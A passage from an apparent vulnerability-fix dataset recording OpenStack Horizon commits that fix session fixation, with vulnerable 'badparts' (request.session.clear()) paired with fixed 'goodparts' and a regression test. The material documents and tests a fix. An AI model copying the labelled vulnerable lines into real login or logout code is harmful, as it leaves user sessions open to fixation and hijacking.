api\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\nfrom horizon.base import Horizon\nfrom horizon.views.auth_forms import Login, LoginWithTenant, _set_session_data\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef user_home(request):\n    \"\"\" Reversible named view to direct a user to the appropriate homepage. \"\"\"\n    return shortcuts.redirect(horizon.get_user_home(request.user))\n\n\nclass LoginView(forms.ModalFormView):\n    \"\"\"\n    Logs in a user and redirects them to the URL specified by\n    :func:`horizon.get_user_home`.\n    \"\"\"\n    form_class = Login\n    template_name = \"horizon\/auth\/login.html\"\n\n    def get_context_data(self, **kwargs):\n        context = super(LoginView, self).get_context_data(**kwargs)\n        redirect_to = self.request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n        context[\"redirect_field_name\"] = REDIRECT_FIELD_NAME\n        context[\"next\"] = redirect_to\n        return context\n\n    def get_initial(self):\n        initial = super(LoginView, self).get_initial()\n        current_region = self.request.session.get('region_endpoint', None)\n        requested_region = self.request.GET.get('region', None)\n        regions = dict(getattr(settings, \"AVAILABLE_REGIONS\", []))\n        if requested_region in regions and requested_region != current_region:\n            initial.update({'region': requested_region})\n        return initial\n\n\ndef switch_tenants(request, tenant_id):\n    \"\"\"\n    Swaps a user from one tenant to another using the unscoped token from\n    Keystone to exchange scoped tokens for the new tenant.\n    \"\"\"\n    form, handled = LoginWithTenant.maybe_handle(\n            request, initial={'tenant': tenant_id,\n                              'username': request.user.username})\n    if handled:\n        return handled\n\n    unscoped_token = request.session.get('unscoped_token', None)\n    if unscoped_token:\n        try:\n            token = api.token_create_scoped(request,\n                                            tenant_id,\n                                            unscoped_token)\n            _set_session_data(request, token)\n            user = users.User(users.get_user_from_request(request))\n            return shortcuts.redirect(Horizon.get_user_home(user))\n        except:\n            exceptions.handle(request,\n                              _(\"You are not authorized for that tenant.\"))\n\n    return shortcuts.redirect(\"horizon:auth_login\")\n\n\ndef logout(request):\n    \"\"\" Clears the session and logs the current user out. \"\"\"\n    request.session.clear()\n    # FIXME(gabriel): we don't ship a view named splash\n    return shortcuts.redirect('splash')\n"},"\/horizon\/views\/auth_forms.py":{"changes":[{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]},{"diff":"\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","add":1,"remove":1,"filename":"\/horizon\/views\/auth_forms.py","badparts":["                request.session.clear()"],"goodparts":["                request.user_logout()"]}],"source":"\n \"\"\" Forms used for Horizon's auth mechanisms. \"\"\" import logging from django import shortcuts from django.conf import settings from django.contrib import messages from django.contrib.auth import REDIRECT_FIELD_NAME from django.utils.translation import ugettext as _ from keystoneclient import exceptions as keystone_exceptions from horizon import api from horizon import base from horizon import exceptions from horizon import forms from horizon import users LOG=logging.getLogger(__name__) def _set_session_data(request, token): request.session['serviceCatalog']=token.serviceCatalog request.session['tenant']=token.tenant['name'] request.session['tenant_id']=token.tenant['id'] request.session['token']=token.id request.session['user_name']=token.user['name'] request.session['user_id']=token.user['id'] request.session['roles']=token.user['roles'] class Login(forms.SelfHandlingForm): \"\"\" Form used for logging in a user. Handles authentication with Keystone, choosing a tenant, and fetching a scoped token token for that tenant. Redirects to the URL returned by:meth:`horizon.get_user_home` if successful. Subclass of:class:`~horizon.forms.SelfHandlingForm`. \"\"\" region=forms.ChoiceField(label=_(\"Region\"), required=False) username=forms.CharField(label=_(\"User Name\")) password=forms.CharField(label=_(\"Password\"), widget=forms.PasswordInput(render_value=False)) def __init__(self, *args, **kwargs): super(Login, self).__init__(*args, **kwargs) default_region=(settings.OPENSTACK_KEYSTONE_URL, \"Default Region\") regions=getattr(settings, 'AVAILABLE_REGIONS',[default_region]) self.fields['region'].choices=regions if len(regions)==1: self.fields['region'].initial=default_region[0] self.fields['region'].widget=forms.widgets.HiddenInput() def handle(self, request, data): endpoint=data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL region_name=dict(self.fields['region'].choices)[endpoint] request.session['region_endpoint']=endpoint request.session['region_name']=region_name redirect_to=request.REQUEST.get(REDIRECT_FIELD_NAME, \"\") if data.get('tenant', None): try: token=api.token_create(request, data.get('tenant'), data['username'], data['password']) tenants=api.tenant_list_for_token(request, token.id) except: msg=_('Unable to authenticate for that project.') exceptions.handle(request, message=msg, escalate=True) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) elif data.get('username', None): try: unscoped_token=api.token_create(request, '', data['username'], data['password']) except keystone_exceptions.Unauthorized: exceptions.handle(request, _('Invalid user name or password.')) except: request.session.clear() exceptions.handle(request, message=_(\"An error occurred authenticating.\" \" Please try again later.\"), escalate=True) request.session['unscoped_token']=unscoped_token.id request.user.username=data['username'] try: tenants=api.tenant_list_for_token(request, unscoped_token.id) except: exceptions.handle(request) tenants=[] if not tenants: messages.error(request, _('You are not authorized for any projects.') % {\"user\": data['username']}, extra_tags=\"login\") return while tenants: tenant=tenants.pop() try: token=api.token_create_scoped(request, tenant.id, unscoped_token.id) break except: exceptions.handle(request, ignore=True) token=None if token is None: raise exceptions.NotAuthorized( _(\"You are not authorized for any available projects.\")) _set_session_data(request, token) user=users.get_user_from_request(request) redirect=redirect_to or base.Horizon.get_user_home(user) return shortcuts.redirect(redirect) class LoginWithTenant(Login): \"\"\" Exactly like:class:`.Login` but includes the tenant id as a field so that the process of choosing a default tenant is bypassed. \"\"\" region=forms.ChoiceField(required=False) username=forms.CharField(max_length=\"20\", widget=forms.TextInput(attrs={'readonly': 'readonly'})) tenant=forms.CharField(widget=forms.HiddenInput()) ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nForms used for Horizon's auth mechanisms.\n\"\"\"\n\nimport logging\n\nfrom django import shortcuts\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.utils.translation import ugettext as _\nfrom keystoneclient import exceptions as keystone_exceptions\n\nfrom horizon import api\nfrom horizon import base\nfrom horizon import exceptions\nfrom horizon import forms\nfrom horizon import users\n\n\nLOG = logging.getLogger(__name__)\n\n\ndef _set_session_data(request, token):\n    request.session['serviceCatalog'] = token.serviceCatalog\n    request.session['tenant'] = token.tenant['name']\n    request.session['tenant_id'] = token.tenant['id']\n    request.session['token'] = token.id\n    request.session['user_name'] = token.user['name']\n    request.session['user_id'] = token.user['id']\n    request.session['roles'] = token.user['roles']\n\n\nclass Login(forms.SelfHandlingForm):\n    \"\"\" Form used for logging in a user.\n\n    Handles authentication with Keystone, choosing a tenant, and fetching\n    a scoped token token for that tenant. Redirects to the URL returned\n    by :meth:`horizon.get_user_home` if successful.\n\n    Subclass of :class:`~horizon.forms.SelfHandlingForm`.\n    \"\"\"\n    region = forms.ChoiceField(label=_(\"Region\"), required=False)\n    username = forms.CharField(label=_(\"User Name\"))\n    password = forms.CharField(label=_(\"Password\"),\n                               widget=forms.PasswordInput(render_value=False))\n\n    def __init__(self, *args, **kwargs):\n        super(Login, self).__init__(*args, **kwargs)\n        # FIXME(gabriel): When we switch to region-only settings, we can\n        # remove this default region business.\n        default_region = (settings.OPENSTACK_KEYSTONE_URL, \"Default Region\")\n        regions = getattr(settings, 'AVAILABLE_REGIONS', [default_region])\n        self.fields['region'].choices = regions\n        if len(regions) == 1:\n            self.fields['region'].initial = default_region[0]\n            self.fields['region'].widget = forms.widgets.HiddenInput()\n\n    def handle(self, request, data):\n        # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n        # form post doesn't include a region.\n        endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n        region_name = dict(self.fields['region'].choices)[endpoint]\n        request.session['region_endpoint'] = endpoint\n        request.session['region_name'] = region_name\n\n        redirect_to = request.REQUEST.get(REDIRECT_FIELD_NAME, \"\")\n\n        if data.get('tenant', None):\n            try:\n                token = api.token_create(request,\n                                         data.get('tenant'),\n                                         data['username'],\n                                         data['password'])\n                tenants = api.tenant_list_for_token(request, token.id)\n            except:\n                msg = _('Unable to authenticate for that project.')\n                exceptions.handle(request,\n                                  message=msg,\n                                  escalate=True)\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n            redirect = redirect_to or base.Horizon.get_user_home(user)\n            return shortcuts.redirect(redirect)\n\n        elif data.get('username', None):\n            try:\n                unscoped_token = api.token_create(request,\n                                                  '',\n                                                  data['username'],\n                                                  data['password'])\n            except keystone_exceptions.Unauthorized:\n                exceptions.handle(request,\n                                  _('Invalid user name or password.'))\n            except:\n                # If we get here we don't want to show a stack trace to the\n                # user. However, if we fail here, there may be bad session\n                # data that's been cached already.\n                request.session.clear()\n                exceptions.handle(request,\n                                  message=_(\"An error occurred authenticating.\"\n                                            \" Please try again later.\"),\n                                  escalate=True)\n\n            # Unscoped token\n            request.session['unscoped_token'] = unscoped_token.id\n            request.user.username = data['username']\n\n            # Get the tenant list, and log in using first tenant\n            # FIXME (anthony): add tenant chooser here?\n            try:\n                tenants = api.tenant_list_for_token(request, unscoped_token.id)\n            except:\n                exceptions.handle(request)\n                tenants = []\n\n            # Abort if there are no valid tenants for this user\n            if not tenants:\n                messages.error(request,\n                               _('You are not authorized for any projects.') %\n                                {\"user\": data['username']},\n                               extra_tags=\"login\")\n                return\n\n            # Create a token.\n            # NOTE(gabriel): Keystone can return tenants that you're\n            # authorized to administer but not to log into as a user, so in\n            # the case of an Unauthorized error we should iterate through\n            # the tenants until one succeeds or we've failed them all.\n            while tenants:\n                tenant = tenants.pop()\n                try:\n                    token = api.token_create_scoped(request,\n                                                    tenant.id,\n                                                    unscoped_token.id)\n                    break\n                except:\n                    # This will continue for recognized Unauthorized\n                    # exceptions from keystoneclient.\n                    exceptions.handle(request, ignore=True)\n                    token = None\n            if token is None:\n                raise exceptions.NotAuthorized(\n                    _(\"You are not authorized for any available projects.\"))\n\n            _set_session_data(request, token)\n            user = users.get_user_from_request(request)\n        redirect = redirect_to or base.Horizon.get_user_home(user)\n        return shortcuts.redirect(redirect)\n\n\nclass LoginWithTenant(Login):\n    \"\"\"\n    Exactly like :class:`.Login` but includes the tenant id as a field\n    so that the process of choosing a default tenant is bypassed.\n    \"\"\"\n    region = forms.ChoiceField(required=False)\n    username = forms.CharField(max_length=\"20\",\n                       widget=forms.TextInput(attrs={'readonly': 'readonly'}))\n    tenant = forms.CharField(widget=forms.HiddenInput())\n"}},"msg":"Fixes lp978896 -- Session fixation security fix\n\nRotates session tokens on logout, and properly clears sessions\nto prevent data leakage.\n\nChange-Id: I52d03576d07b1e023a7730857156d0da1887b1df"}},"https:\/\/github.com\/chenyingnan\/horizon":{"041b1c44c7d6cf5429505067c32f8f35166a8bab":{"url":"https:\/\/api.github.com\/repos\/chenyingnan\/horizon\/commits\/041b1c44c7d6cf5429505067c32f8f35166a8bab","html_url":"https:\/\/github.com\/chenyingnan\/horizon\/commit\/041b1c44c7d6cf5429505067c32f8f35166a8bab","sha":"041b1c44c7d6cf5429505067c32f8f35166a8bab","keyword":"session fixation prevent","diff":"diff --git a\/horizon\/exceptions.py b\/horizon\/exceptions.py\nindex 7af8a0a69..778719e3d 100644\n--- a\/horizon\/exceptions.py\n+++ b\/horizon\/exceptions.py\n@@ -203,7 +203,7 @@ class indicating the type of exception that was encountered will be\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from\ndiff --git a\/horizon\/middleware.py b\/horizon\/middleware.py\nindex f20c1f09e..f141ff362 100644\n--- a\/horizon\/middleware.py\n+++ b\/horizon\/middleware.py\n@@ -49,6 +49,15 @@ def process_request(self, request):\n \n         Adds a :class:`~horizon.users.User` object to ``request.user``.\n         \"\"\"\n+        # A quick and dirty way to log users out\n+        def user_logout(request):\n+            if hasattr(request, '_cached_user'):\n+                del request._cached_user\n+            # Use flush instead of clear, so we rotate session keys in\n+            # addition to clearing all the session data\n+            request.session.flush()\n+        request.__class__.user_logout = user_logout\n+\n         request.__class__.user = users.LazyUser()\n         request.horizon = {'dashboard': None, 'panel': None}\n \ndiff --git a\/horizon\/tests\/auth_tests.py b\/horizon\/tests\/auth_tests.py\nindex ba1647777..9f295d0c0 100644\n--- a\/horizon\/tests\/auth_tests.py\n+++ b\/horizon\/tests\/auth_tests.py\n@@ -18,6 +18,8 @@\n #    License for the specific language governing permissions and limitations\n #    under the License.\n \n+import time\n+\n from django import http\n from django.core.urlresolvers import reverse\n from keystoneclient import exceptions as keystone_exceptions\n@@ -220,3 +222,53 @@ def test_logout(self):\n \n         self.assertRedirectsNoFollow(res, reverse('splash'))\n         self.assertNotIn(KEY, self.client.session)\n+\n+    def test_session_fixation(self):\n+        session_ids = []\n+        form_data = {'method': 'Login',\n+                     'region': 'http:\/\/localhost:5000\/v2.0',\n+                     'password': self.user.password,\n+                     'username': self.user.name}\n+\n+        self.mox.StubOutWithMock(api, 'token_create')\n+        self.mox.StubOutWithMock(api, 'tenant_list_for_token')\n+        self.mox.StubOutWithMock(api, 'token_create_scoped')\n+\n+        aToken = self.tokens.unscoped_token\n+        bToken = self.tokens.scoped_token\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+\n+        api.token_create(IsA(http.HttpRequest), \"\", self.user.name,\n+                         self.user.password).AndReturn(aToken)\n+        api.tenant_list_for_token(IsA(http.HttpRequest),\n+                                  aToken.id).AndReturn([self.tenants.first()])\n+        api.token_create_scoped(IsA(http.HttpRequest),\n+                                self.tenant.id,\n+                                aToken.id).AndReturn(bToken)\n+        self.mox.ReplayAll()\n+\n+        res = self.client.get(reverse('horizon:auth_login'))\n+        self.assertEqual(res.cookies.get('sessionid'), None)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+\n+        self.assertEquals(self.client.session['user_name'],\n+                          self.user.name)\n+        self.client.session['foobar'] = 'MY TEST VALUE'\n+        res = self.client.get(reverse('horizon:auth_logout'))\n+        session_ids.append(res.cookies['sessionid'].value)\n+        self.assertEqual(len(self.client.session.items()), 0)\n+        # Sleep for 1 second so the session values are different if\n+        # using the signed_cookies backend.\n+        time.sleep(1)\n+        res = self.client.post(reverse('horizon:auth_login'), form_data)\n+        session_ids.append(res.cookies['sessionid'].value)\n+        # Make sure all 3 session id values are different\n+        self.assertEqual(len(session_ids), len(set(session_ids)))\ndiff --git a\/horizon\/users.py b\/horizon\/users.py\nindex f5dcde81a..6e6be8e5a 100644\n--- a\/horizon\/users.py\n+++ b\/horizon\/users.py\n@@ -59,7 +59,7 @@ def get_user_from_request(request):\n         # If any of those keys are missing from the session it is\n         # overwhelmingly likely that we're dealing with an outdated session.\n         LOG.exception(\"Error while creating User from session.\")\n-        request.session.clear()\n+        request.user_logout()\n         raise exceptions.NotAuthorized(_(\"Your session has expired. \"\n                                          \"Please log in again.\"))\n \ndiff --git a\/horizon\/views\/auth.py b\/horizon\/views\/auth.py\nindex b48f24a65..5120eed76 100644\n--- a\/horizon\/views\/auth.py\n+++ b\/horizon\/views\/auth.py\n@@ -96,6 +96,6 @@ def switch_tenants(request, tenant_id):\n \n def logout(request):\n     \"\"\" Clears the session and logs the current user out. \"\"\"\n-    request.session.clear()\n+    request.user_logout()\n     # FIXME(gabriel): we don't ship a view named splash\n     return shortcuts.redirect('splash')\ndiff --git a\/horizon\/views\/auth_forms.py b\/horizon\/views\/auth_forms.py\nindex 287448685..2ebecfcda 100644\n--- a\/horizon\/views\/auth_forms.py\n+++ b\/horizon\/views\/auth_forms.py\n@@ -77,6 +77,16 @@ def __init__(self, *args, **kwargs):\n             self.fields['region'].widget = forms.widgets.HiddenInput()\n \n     def handle(self, request, data):\n+        if 'user_name' in request.session:\n+            if request.session['user_name'] != data['username']:\n+                # To avoid reusing another user's session, create a\n+                # new, empty session if the existing session\n+                # corresponds to a different authenticated user.\n+                request.session.flush()\n+        # Always cycle the session key when viewing the login form to\n+        # prevent session fixation\n+        request.session.cycle_key()\n+\n         # For now we'll allow fallback to OPENSTACK_KEYSTONE_URL if the\n         # form post doesn't include a region.\n         endpoint = data.get('region', None) or settings.OPENSTACK_KEYSTONE_URL\n@@ -116,7 +126,7 @@ def handle(self, request, data):\n                 # If we get here we don't want to show a stack trace to the\n                 # user. However, if we fail here, there may be bad session\n                 # data that's been cached already.\n-                request.session.clear()\n+                request.user_logout()\n                 exceptions.handle(request,\n                                   message=_(\"An error occurred authenticating.\"\n                                             \" Please try again later.\"),\n","message":"","files":{"\/horizon\/exceptions.py":{"changes":[{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]},{"diff":"\n     if issubclass(exc_type, UNAUTHORIZED):\n         if ignore:\n             return NotAuthorized\n-        request.session.clear()\n+        request.user_logout()\n         if not handled:\n             LOG.debug(\"Unauthorized: %s\" % exc_value)\n             # We get some pretty useless error messages back from","add":1,"remove":1,"filename":"\/horizon\/exceptions.py","badparts":["        request.session.clear()"],"goodparts":["        request.user_logout()"]}],"source":"\n \"\"\" Exceptions raised by the Horizon code and the machinery for handling them. \"\"\" import logging import sys from django.conf import settings from django.contrib import messages from django.utils.translation import ugettext as _ from cloudfiles import errors as swiftclient from glanceclient.common import exceptions as glanceclient from keystoneclient import exceptions as keystoneclient from novaclient import exceptions as novaclient LOG=logging.getLogger(__name__) class HorizonException(Exception): \"\"\" Base exception class for distinguishing our own exception classes. \"\"\" pass class Http302(HorizonException): \"\"\" Error class which can be raised from within a handler to cause an early bailout and redirect at the middleware level. \"\"\" status_code=302 def __init__(self, location, message=None): self.location=location self.message=message class NotAuthorized(HorizonException): \"\"\" Raised whenever a user attempts to access a resource which they do not have role-based access to(such as when failing the :func:`~horizon.decorators.require_roles` decorator). The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthorized`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=401 class NotAuthenticated(HorizonException): \"\"\" Raised when a user is trying to make requests and they are not logged in. The included:class:`~horizon.middleware.HorizonMiddleware` catches ``NotAuthenticated`` and handles it gracefully by displaying an error message and redirecting the user to a login page. \"\"\" status_code=403 class NotFound(HorizonException): \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\" status_code=404 class RecoverableError(HorizonException): \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\" status_code=100 class ServiceCatalogException(HorizonException): \"\"\" Raised when a requested service is not available in the ``ServiceCatalog`` returned by Keystone. \"\"\" def __init__(self, service_name): message='Invalid service catalog service: %s' % service_name super(ServiceCatalogException, self).__init__(message) class AlreadyExists(HorizonException): \"\"\" Exception to be raised when trying to create an API resource which already exists. \"\"\" def __init__(self, name, resource_type): self.attrs={\"name\": name, \"resource\": resource_type} self.msg='A %(resource)s with the name \"%(name)s\" already exists.' def __repr__(self): return self.msg % self.attrs def __unicode__(self): return _(self.msg) % self.attrs class HandledException(HorizonException): \"\"\" Used internally to track exceptions that have gone through :func:`horizon.exceptions.handle` more than once. \"\"\" def __init__(self, wrapped): self.wrapped=wrapped HORIZON_CONFIG=getattr(settings, \"HORIZON_CONFIG\",{}) EXCEPTION_CONFIG=HORIZON_CONFIG.get(\"exceptions\",{}) UNAUTHORIZED=(keystoneclient.Unauthorized, keystoneclient.Forbidden, novaclient.Unauthorized, novaclient.Forbidden, glanceclient.AuthorizationFailure, glanceclient.Unauthorized, swiftclient.AuthenticationFailed, swiftclient.AuthenticationError) UNAUTHORIZED +=tuple(EXCEPTION_CONFIG.get('unauthorized',[])) NOT_FOUND=(keystoneclient.NotFound, novaclient.NotFound, glanceclient.NotFound, swiftclient.NoSuchContainer, swiftclient.NoSuchObject) NOT_FOUND +=tuple(EXCEPTION_CONFIG.get('not_found',[])) RECOVERABLE=(keystoneclient.ClientException, keystoneclient.AuthorizationFailure, novaclient.ClientException, glanceclient.ClientException, swiftclient.Error, AlreadyExists) RECOVERABLE +=tuple(EXCEPTION_CONFIG.get('recoverable',[])) def handle(request, message=None, redirect=None, ignore=False, escalate=False): \"\"\" Centralized error handling for Horizon. Because Horizon consumes so many different APIs with completely different ``Exception`` types, it's necessary to have a centralized place for handling exceptions which may be raised. Exceptions are roughly divided into 3 types: problems. These result in being logged out and sent to the login screen. located via the API. These generally result in a user-facing error message, but are otherwise returned to the normal code flow. Optionally a redirect value may be passed to the error handler so users are returned to a different view than the one requested in addition to the error message. but drop directly back to the regular code flow. All other exceptions bubble the stack as normal unless the ``ignore`` argument is passed in as ``True``, in which case only unrecognized errors are bubbled. If the exception is not re-raised, an appropriate wrapper exception class indicating the type of exception that was encountered will be returned. \"\"\" exc_type, exc_value, exc_traceback=sys.exc_info() handled=issubclass(exc_type, HandledException) wrap=False if handled: exc_type, exc_value, exc_traceback=exc_value.wrapped wrap=True if issubclass(exc_type, HorizonException): message=exc_value elif message and \"%(exc)s\" in message: message=message %{\"exc\": exc_value} if issubclass(exc_type, UNAUTHORIZED): if ignore: return NotAuthorized request.session.clear() if not handled: LOG.debug(\"Unauthorized: %s\" % exc_value) fallback=_(\"Unauthorized. Please try logging in again.\") messages.error(request, message or fallback, extra_tags=\"login\") raise NotAuthorized if issubclass(exc_type, NOT_FOUND): wrap=True if not ignore and not handled: LOG.debug(\"Not Found: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return NotFound if issubclass(exc_type, RECOVERABLE): wrap=True if not ignore and not handled: LOG.debug(\"Recoverable error: %s\" % exc_value) messages.error(request, message or exc_value) if redirect: raise Http302(redirect) if not escalate: return RecoverableError if wrap: raise HandledException([exc_type, exc_value, exc_traceback]) raise exc_type, exc_value, exc_traceback ","sourceWithComments":"# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 Nebula, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http:\/\/www.apache.org\/licenses\/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nExceptions raised by the Horizon code and the machinery for handling them.\n\"\"\"\n\nimport logging\nimport sys\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.utils.translation import ugettext as _\nfrom cloudfiles import errors as swiftclient\nfrom glanceclient.common import exceptions as glanceclient\nfrom keystoneclient import exceptions as keystoneclient\nfrom novaclient import exceptions as novaclient\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HorizonException(Exception):\n    \"\"\" Base exception class for distinguishing our own exception classes. \"\"\"\n    pass\n\n\nclass Http302(HorizonException):\n    \"\"\"\n    Error class which can be raised from within a handler to cause an\n    early bailout and redirect at the middleware level.\n    \"\"\"\n    status_code = 302\n\n    def __init__(self, location, message=None):\n        self.location = location\n        self.message = message\n\n\nclass NotAuthorized(HorizonException):\n    \"\"\"\n    Raised whenever a user attempts to access a resource which they do not\n    have role-based access to (such as when failing the\n    :func:`~horizon.decorators.require_roles` decorator).\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthorized`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 401\n\n\nclass NotAuthenticated(HorizonException):\n    \"\"\"\n    Raised when a user is trying to make requests and they are not logged in.\n\n    The included :class:`~horizon.middleware.HorizonMiddleware` catches\n    ``NotAuthenticated`` and handles it gracefully by displaying an error\n    message and redirecting the user to a login page.\n    \"\"\"\n    status_code = 403\n\n\nclass NotFound(HorizonException):\n    \"\"\" Generic error to replace all \"Not Found\"-type API errors. \"\"\"\n    status_code = 404\n\n\nclass RecoverableError(HorizonException):\n    \"\"\" Generic error to replace any \"Recoverable\"-type API errors. \"\"\"\n    status_code = 100  # HTTP status code \"Continue\"\n\n\nclass ServiceCatalogException(HorizonException):\n    \"\"\"\n    Raised when a requested service is not available in the ``ServiceCatalog``\n    returned by Keystone.\n    \"\"\"\n    def __init__(self, service_name):\n        message = 'Invalid service catalog service: %s' % service_name\n        super(ServiceCatalogException, self).__init__(message)\n\n\nclass AlreadyExists(HorizonException):\n    \"\"\"\n    Exception to be raised when trying to create an API resource which\n    already exists.\n    \"\"\"\n    def __init__(self, name, resource_type):\n        self.attrs = {\"name\": name, \"resource\": resource_type}\n        self.msg = 'A %(resource)s with the name \"%(name)s\" already exists.'\n\n    def __repr__(self):\n        return self.msg % self.attrs\n\n    def __unicode__(self):\n        return _(self.msg) % self.attrs\n\n\nclass HandledException(HorizonException):\n    \"\"\"\n    Used internally to track exceptions that have gone through\n    :func:`horizon.exceptions.handle` more than once.\n    \"\"\"\n    def __init__(self, wrapped):\n        self.wrapped = wrapped\n\n\nHORIZON_CONFIG = getattr(settings, \"HORIZON_CONFIG\", {})\nEXCEPTION_CONFIG = HORIZON_CONFIG.get(\"exceptions\", {})\n\n\nUNAUTHORIZED = (keystoneclient.Unauthorized,\n                keystoneclient.Forbidden,\n                novaclient.Unauthorized,\n                novaclient.Forbidden,\n                glanceclient.AuthorizationFailure,\n                glanceclient.Unauthorized,\n                swiftclient.AuthenticationFailed,\n                swiftclient.AuthenticationError)\nUNAUTHORIZED += tuple(EXCEPTION_CONFIG.get('unauthorized', []))\n\nNOT_FOUND = (keystoneclient.NotFound,\n             novaclient.NotFound,\n             glanceclient.NotFound,\n             swiftclient.NoSuchContainer,\n             swiftclient.NoSuchObject)\nNOT_FOUND += tuple(EXCEPTION_CONFIG.get('not_found', []))\n\n\n# NOTE(gabriel): This is very broad, and may need to be dialed in.\nRECOVERABLE = (keystoneclient.ClientException,\n               # AuthorizationFailure is raised when Keystone is \"unavailable\".\n               keystoneclient.AuthorizationFailure,\n               novaclient.ClientException,\n               glanceclient.ClientException,\n               swiftclient.Error,\n               AlreadyExists)\nRECOVERABLE += tuple(EXCEPTION_CONFIG.get('recoverable', []))\n\n\ndef handle(request, message=None, redirect=None, ignore=False, escalate=False):\n    \"\"\" Centralized error handling for Horizon.\n\n    Because Horizon consumes so many different APIs with completely\n    different ``Exception`` types, it's necessary to have a centralized\n    place for handling exceptions which may be raised.\n\n    Exceptions are roughly divided into 3 types:\n\n    #. ``UNAUTHORIZED``: Errors resulting from authentication or authorization\n       problems. These result in being logged out and sent to the login screen.\n    #. ``NOT_FOUND``: Errors resulting from objects which could not be\n       located via the API. These generally result in a user-facing error\n       message, but are otherwise returned to the normal code flow. Optionally\n       a redirect value may be passed to the error handler so users are\n       returned to a different view than the one requested in addition to the\n       error message.\n    #. RECOVERABLE: Generic API errors which generate a user-facing message\n       but drop directly back to the regular code flow.\n\n    All other exceptions bubble the stack as normal unless the ``ignore``\n    argument is passed in as ``True``, in which case only unrecognized\n    errors are bubbled.\n\n    If the exception is not re-raised, an appropriate wrapper exception\n    class indicating the type of exception that was encountered will be\n    returned.\n    \"\"\"\n    exc_type, exc_value, exc_traceback = sys.exc_info()\n\n    # Because the same exception may travel through this method more than\n    # once (if it's re-raised) we may want to treat it differently\n    # the second time (e.g. no user messages\/logging).\n    handled = issubclass(exc_type, HandledException)\n    wrap = False\n\n    # Restore our original exception information, but re-wrap it at the end\n    if handled:\n        exc_type, exc_value, exc_traceback = exc_value.wrapped\n        wrap = True\n\n    # We trust messages from our own exceptions\n    if issubclass(exc_type, HorizonException):\n        message = exc_value\n    # If the message has a placeholder for the exception, fill it in\n    elif message and \"%(exc)s\" in message:\n        message = message % {\"exc\": exc_value}\n\n    if issubclass(exc_type, UNAUTHORIZED):\n        if ignore:\n            return NotAuthorized\n        request.session.clear()\n        if not handled:\n            LOG.debug(\"Unauthorized: %s\" % exc_value)\n            # We get some pretty useless error messages back from\n            # some clients, so let's define our own fallback.\n            fallback = _(\"Unauthorized. Please try logging in again.\")\n            messages.error(request, message or fallback, extra_tags=\"login\")\n        raise 